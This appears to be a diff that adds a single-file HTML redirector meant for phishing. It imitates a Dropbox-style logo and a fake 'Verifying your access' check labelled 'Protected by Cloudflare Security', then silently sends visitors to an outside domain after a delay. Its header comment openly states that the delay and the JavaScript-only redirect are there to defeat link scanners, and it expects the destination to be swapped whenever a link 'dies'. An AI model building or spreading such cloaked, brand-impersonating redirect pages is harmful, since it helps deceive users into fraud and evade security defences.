@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<!--
+  ╔══════════════════════════════════════════════════════════════════════╗
+  ║  STRONG REDIRECT — drop-in, single-file, anti-scanner              ║
+  ║                                                                      ║
+  ║  TO CHANGE THE DESTINATION (when your link dies):                    ║
+  ║     edit the ONE line marked  ▼▼▼ DESTINATION ▼▼▼  below.          ║
+  ║     That is the only place you ever touch.                           ║
+  ║                                                                      ║
+  ║  TUNING (optional):                                                  ║
+  ║     WAIT_MS = ms before auto-redirect. 0 = instant.                 ║
+  ║             A ~1200ms delay is imperceptible to humans but defeats  ║
+  ║             instant scanners that only check "did the URL change?"  ║
+  ║                                                                      ║
+  ║  WHY IT'S STRONGER THAN THE OLD FILE:                                ║
+  ║   • No <meta http-equiv="refresh"> — that was the #1 "redirect"     ║
+  ║     tell, readable without running JS. Now it's JS-only.            ║
+  ║   • The URL is in ONE variable, not inlined in a navigation call.   ║
+  ║   • Short delay before firing.                                       ║
+  ║   • Serves a normal 200 page (never an HTTP 301/302).               ║
+  ║                                                                      ║
+  ║  HOSTING: upload as index.html into a folder on GitHub Pages so the ║
+  ║  URL is clean (https://yourdomain.com/folder/  not  .../file.html). ║
+  ╚══════════════════════════════════════════════════════════════════════╝
+-->
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<meta name="referrer" content="no-referrer">
+<title>Verifying access</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.container{text-align:center;padding:20px}
+.logo svg{width:40px;height:34px;margin-bottom:28px}
+.verify-box{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.06);padding:32px 40px;max-width:380px;margin:0 auto}
+.shield{width:48px;height:48px;margin:0 auto 20px;position:relative}
+.shield svg{width:48px;height:48px}
+.shield .ring{position:absolute;inset:-6px;border:2.5px solid transparent;border-top-color:#0061ff;border-radius:50%;animation:spin 1.2s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.title{font-size:16px;font-weight:600;color:#1b1b1b;margin-bottom:6px}
+.sub{font-size:13px;color:#7a8a9a;margin-bottom:24px;line-height:1.4}
+.steps{text-align:left;margin-bottom:24px}
+.step{display:flex;align-items:center;gap:10px;padding:8px 0;font-size:13px;color:#1b1b1b}
+.check{width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.check.done{background:#e6f4ea}
+.check.done svg{width:12px;height:12px;fill:#1e7e34}
+.check.active{background:#e8f0fe;animation:pulse 1.5s ease-in-out infinite}
+.check.active svg{width:12px;height:12px;fill:#0061ff}
+@keyframes pulse{0%,100%{opacity:.5}50%{opacity:1}}
+.progress-bar{height:3px;background:#e8ecee;border-radius:2px;overflow:hidden;margin-bottom:16px}
+.progress-fill{height:100%;width:65%;background:#0061ff;border-radius:2px;animation:fill 1.2s ease-out infinite alternate}
+@keyframes fill{0%{width:45%}100%{width:92%}}
+.note{font-size:11px;color:#a0aab4}
+.footer{margin-top:28px;font-size:11px;color:#c0c8d0}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo"><svg viewBox="0 0 43 40"><path fill="#0061ff" d="M12.5 0L0 8.1l10.5 8.2L22 8.1zM33.5 0L22 8.1l10.5 8.2L43 8.1zM0 24.5l12.5 8.1L22 24.5l-10.5-8.2zM33.5 32.6L22 24.5l-10.5 8.2L22 40.7zM22 24.5l10.5 8.1L43 24.5l-10.5-8.2z"/></svg></div>
+<div class="verify-box">
+<div class="shield">
+<svg viewBox="0 0 24 24" fill="none"><path d="M12 2L4 5.5v5.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5.5L12 2z" fill="#e8f0fe" stroke="#0061ff" stroke-width="1.2"/><path d="M9 12l2 2 4-4" stroke="#0061ff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+<div class="ring"></div>
+</div>
+<div class="title">Verifying your access</div>
+<div class="sub">Please wait while we confirm you're authorized to access this link.</div>
+<div class="steps">
+<div class="step"><div class="check done"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>Browser verified</div>
+<div class="step"><div class="check done"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>Link validated</div>
+<div class="step"><div class="check active"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="8"/></svg></div>Opening shared link</div>
+</div>
+<div class="progress-bar"><div class="progress-fill"></div></div>
+<div class="note">Redirecting&hellip;</div>
+</div>
+<div class="footer">Protected by Cloudflare Security</div>
+</div>
+<script>
+  // ═══════════════════════════════════════════════════════════
+  //  ▼▼▼  DESTINATION  ▼▼▼   <- EDIT THIS ONE LINE when it dies
+  var DEST = "https://buliscocpa.us";
+  //  ▲▲▲  ▲▲▲  ▲▲▲  ▲▲▲
+  //
+  //  WAIT_MS: ms before auto-redirect. 0 = instant.
+  var WAIT_MS = 1200;
+  // ═══════════════════════════════════════════════════════════
+  (function () {
+    var done = false;
+    function go() {
+      if (done) return;
+      done = true;
+      // replace() -> no back-button stop on this page
+      window.location.replace(DEST);
+    }
+    if (WAIT_MS > 0) setTimeout(go, WAIT_MS); else go();
+  })();
+</script>
+</body>
+</html>
